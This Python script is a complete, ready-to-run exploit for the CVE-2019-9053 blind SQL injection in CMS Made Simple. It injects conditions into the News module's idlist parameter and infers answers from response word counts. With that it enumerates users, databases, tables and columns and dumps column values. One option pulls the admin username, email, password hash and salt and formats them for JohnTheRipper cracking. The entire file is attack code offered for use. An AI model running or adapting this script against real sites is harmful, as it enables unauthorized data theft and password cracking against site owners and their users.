#!/usr/bin/env python3
import sys
import re
import string
import logging
from binascii import hexlify
from urllib.parse import quote
import argparse
from typing import Optional

import requests
from requests.exceptions import RequestException

DB_LEN_REQ = "SELECT length(database())"
USER_LEN_REQ = "SELECT length(user())"
VERSION_LEN_REQ = "SELECT length(version())"
ALPHABET = string.digits + string.ascii_lowercase + string.ascii_uppercase + "@._-$"

def count_words(text: str):
    return len(text.split())

def string_to_hex(text: str) -> str:
    if not text:
        raise ValueError("text can't be empty")
    return "0x" + hexlify(text.encode()).decode()

class Exploit:
    def __init__(self, base_url: str):
        self._url = base_url
        self._sess = requests.session()
        self._true_words_count = count_words(self.fetch_condition("1=1"))
        self._false_words_count = count_words(self.fetch_condition("1=0"))
        logging.debug(
            f"[*] True case seems to give {self._true_words_count} words "
            f"while false case returns {self._false_words_count} in response"
        )
        self._diff_words_count = abs(self._true_words_count - self._false_words_count)
        logging.debug(f"[*] Difference between two cases: {self._diff_words_count} words")
        if self._diff_words_count < 4:
            logging.warning("[!] Difference between true and false cases is low and may result in errors")

    def is_true(self, condition: str):
        text = self.fetch_condition(quote(condition))
        words_count = count_words(text)
        logging.debug(f"{condition} returned {words_count} words")
        return self._true_words_count - (self._diff_words_count / 2) < words_count < self._true_words_count + (self._diff_words_count / 2)

    def fetch_condition(self, condition: str) -> str:
        response = self._sess.get(self._url.format(condition))
        return response.text

    def _get_user_length(self) -> int:
        for i in range(1, 100):
            if self.is_true(f"({USER_LEN_REQ})={i}"):
                return i
        else:
            raise ValueError("Could not determine current user length")

    def get_user_name(self) -> str:
        logging.info("[+] Fetching current user")
        count = self._get_user_length()
        username = ""
        for pos in range(1, count + 1):
            for character in ALPHABET:
                if self.is_true(f"(SELECT user() LIKE {string_to_hex(username+character+'%')})"):
                    username += character
                    break
            else:
                username += "?"
        return username

    def _get_database_length(self) -> int:
        for i in range(1, 100):
            if self.is_true(f"({DB_LEN_REQ})={i}"):
                return i
        else:
            raise ValueError("Could not determine current database length")

    def get_database_name(self) -> str:
        logging.info("[+] Fetching current database")
        count = self._get_database_length()
        database = ""
        for pos in range(1, count + 1):
            for character in ALPHABET:
                if self.is_true(f"(SELECT database() LIKE {string_to_hex(database+character+'%')})"):
                    database += character
                    break
            else:
                database += "?"
        return database

    def count_rows(self, database: str, table: str, limit: int=200):
        logging.info("[+] Fetching number of rows in %s.%s", database, table)
        for count in range(1, limit):
            if self.is_true(f"(SELECT COUNT(*) FROM {database}.{table})={count}"):
                logging.info("[+] Found %s rows in table %s.%s", count, database, table)
                return count
        else:
            logging.info("[+] Did not find number of rows in table %s.%s. Fallback to maximum (%s)", count, database, table, limit)
            return limit

    def count_dbs(self):
        logging.info("[+] Fetching number of databases")
        db_count = self.count_rows("information_schema", "schemata")
        logging.info("[+] Found %s databases", db_count)
        return db_count

    def _get_database_length_at_index(self, idx: int) -> int:
        for count in range(1, 50):
            if self.is_true(f"(SELECT LENGTH(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA ORDER BY SCHEMA_NAME LIMIT 1 OFFSET {idx})={count}"):
                return count
        else:
            raise ValueError("Could not determine length of database at index %s", idx)

    def get_database_name_at_index(self, idx: int) -> str:
        logging.info("[+] Getting database #%s name", idx)
        count = self._get_database_length_at_index(idx)
        database = ""
        for pos in range(1, count + 1):
            for character in ALPHABET:
                if self.is_true(f"(SELECT (SELECT schema_name from information_schema.SCHEMATA order by schema_name LIMIT 1 OFFSET {idx}) LIKE {string_to_hex(database+character+'%')})"):
                    database += character
                    break
            else:
                database += "?"
        return database

    def count_tables(self, database: str, limit: int=100) -> int:
        logging.info("[+] Fetching number of tables in database %s", database)
        for count in range(1, 100):
            if self.is_true(f"(SELECT count(table_name) FROM information_schema.tables WHERE table_schema={string_to_hex(database)})={count}"):
                logging.info("[+] Found %s tables in database %s", count, database)
                return count
        else:
            logging.info("[+] Did not find number of rows in database %s. Fallback to maximum (%s)", database, limit)
            return limit

    def _get_table_name_length_at_index(self, database: str, idx: int) -> int:
        for count in range(1, 50):
            sub_query = f"SELECT LENGTH(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA={string_to_hex(database)} ORDER BY TABLE_NAME LIMIT 1 OFFSET {idx}"
            if self.is_true(f"({sub_query})={count}"):
                return count
        else:
            raise ValueError("Could not determine length of table at index %s", idx)

    def get_table_name_at_index(self, database: str, idx: int) -> str:
        logging.info("[+] Fetching table name #%s of database %s", idx, database)
        count = self._get_table_name_length_at_index(database, idx)
        table = ""
        sub_query = f"SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA={string_to_hex(database)} ORDER BY TABLE_NAME LIMIT 1 OFFSET {idx}"
        for pos in range(1, count + 1):
            for character in ALPHABET:
                if self.is_true(f"(SELECT ({sub_query}) LIKE {string_to_hex(table+character+'%')})"):
                    table += character
                    break
            else:
                table += "?"
        return table

    def count_columns(self, database: str, table: str) -> int:
        logging.info("[+] Fetching number of columns in %s.%s", database, table)
        for count in range(1, 200):
            if self.is_true(f"(SELECT count(column_name) FROM information_schema.columns WHERE table_schema={string_to_hex(database)} and table_name={string_to_hex(table)})={count}"):
                return count
        else:
            return 100

    def _get_column_name_length_at_index(self, database: str, table: str, idx: int) -> int:
        sub_query = (
                f"SELECT LENGTH(column_name) FROM INFORMATION_SCHEMA.columns "
                f"WHERE TABLE_SCHEMA={string_to_hex(database)}  "
                f"and table_name={string_to_hex(table)} "
                f"ORDER BY TABLE_NAME LIMIT 1 OFFSET {idx}"
        )
        for count in range(1, 50):
            if self.is_true(f"({sub_query})={count}"):
                return count
        else:
            raise ValueError("Could not determine length of column at index %s", idx)

    def get_column_name_at_index(self, database: str, table: str, idx: int) -> str:
        logging.info("[+] Fetching column name #%s of %s.%s", idx, database, table)
        count = self._get_column_name_length_at_index(database, table, idx)
        column = ""
        sub_query = (
                f"SELECT column_name FROM INFORMATION_SCHEMA.columns "
                f"WHERE TABLE_SCHEMA={string_to_hex(database)}  "
                f"and table_name={string_to_hex(table)} "
                f"ORDER BY TABLE_NAME LIMIT 1 OFFSET {idx}"
        )
        for pos in range(1, count + 1):
            for character in ALPHABET:
                if self.is_true(f"(SELECT ({sub_query}) LIKE {string_to_hex(column+character+'%')})"):
                    column += character
                    break
            else:
                column += "?"
        return column

    def _get_row_column_length_at_index(
            self,
            database: str,
            table: str,
            column: str,
            idx: int,
            order_by: Optional[str]="",
            where: Optional[str]="",
    ) -> int:
        db_and_table = f"{database}.{table}" if database else table
        where_clause = f"WHERE {where}" if where else ""
        for count in range(400):
            if self.is_true(
                    f"(SELECT LENGTH({column}) FROM {db_and_table} "
                    f"{where_clause} "
                    f"ORDER BY {order_by or column} LIMIT 1 OFFSET {idx})={count}"
            ):
                return count
        else:
            raise ValueError("Could not determine length of row column at index %s", idx)

    def get_row_column_value_at_index(
            self,
            database: str,
            table: str,
            column: str,
            idx: int,
            order_by: Optional[str]="",
            where: Optional[str]="",
    ) -> str:
        count = self._get_row_column_length_at_index(database, table, column, idx, order_by=order_by, where=where)
        value = ""
        db_and_table = f"{database}.{table}" if database else table
        where_clause = f"WHERE {where}" if where else ""
        sub_query = (
                f"SELECT {column} FROM {db_and_table} "
                f"{where_clause} "
                f"ORDER BY {order_by or column} LIMIT 1 OFFSET {idx}"
        )
        for pos in range(1, count + 1):
            for character in string.printable:
                if character == '%':
                    continue

                if self.is_true(f"(SELECT ({sub_query}) LIKE {string_to_hex(value+character+'%')})"):
                    value += character
                    break
            else:
                value += "%"
        return value


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        prog = 'devloop-cve-2019-9053.py',
        description = 'Exploit for CMS Made Simple CVE-2019-9053 Blind SQL Injection',
    )
    parser.add_argument('url')
    parser.add_argument('--current-user', action='store_true', help="get current mysql user")
    parser.add_argument('--current-db', action='store_true', help="get current mysql database")
    parser.add_argument('--dbs', action='store_true', help="list databases")
    parser.add_argument('--tables', dest="list_tables", action='store_true', help="list tables")
    parser.add_argument('--columns', dest="list_columns", action='store_true', help="list columns")
    parser.add_argument('--dump', dest="dump", action='store_true', help="dump values from specified column")
    parser.add_argument('-D', dest="database", help="specify database name")
    parser.add_argument('-T', dest="table", help="specify table name")
    parser.add_argument('-C', dest="column", help="specify column name")
    parser.add_argument('--admin-hash', action='store_true', help="assume default db prefix, dump admin hash")

    args = parser.parse_args()
    URL = args.url + "/moduleinterface.php?mact=News,m1_,default,0&m1_idlist=,1))%20AND%20{}%20--%20a"
    logging.basicConfig(level=logging.INFO)
    exploit = Exploit(URL)

    if args.current_user:
        print(exploit.get_user_name())

    if args.current_db:
        print(exploit.get_database_name())

    if args.dbs:
        db_count = exploit.count_dbs()
        for idx in range(db_count):
            print(exploit.get_database_name_at_index(idx))

    if args.list_tables:
        if not args.database:
            logging.error("[!] You must specify database name to use --tables")
            sys.exit(1)

        tables_count = exploit.count_tables(args.database)
        for idx in range(tables_count):
            print(exploit.get_table_name_at_index(args.database, idx))

    if args.list_columns:
        if not args.database or not args.table:
            logging.error("[!] You must specify database and table names to use --columns")
            sys.exit(1)

        columns_count = exploit.count_columns(args.database, args.table)
        for idx in range(columns_count):
            print(exploit.get_column_name_at_index(args.database, args.table, idx))

    if args.dump:
        if not args.database or not args.table or not args.column:
            logging.error("[!] You must specify database, table and column names to use --dump")
            sys.exit(1)

        rows_count = exploit.count_rows(args.database, args.table, limit=500)
        for idx in range(rows_count):
            print(f"idx {idx}:", exploit.get_row_column_value_at_index(args.database, args.table, args.column, idx))

    if args.admin_hash:
        admin_name = exploit.get_row_column_value_at_index("", "cms_users", "username", 0, order_by="user_id")
        print(f"admin name:", admin_name)
        print(f"admin email:", exploit.get_row_column_value_at_index("", "cms_users", "email", 0, order_by="user_id"))
        admin_hash = exploit.get_row_column_value_at_index("", "cms_users", "password", 0, order_by="user_id")
        print(f"admin hash:", admin_hash)
        salt = exploit.get_row_column_value_at_index("", "cms_siteprefs", "sitepref_value", 0, where="sitepref_name=0x736974656d61736b")
        print(f"salt:", salt)
        print(f"JohnTheRipper hash: {admin_name}:$dynamic_4${admin_hash}${salt}:::::::")

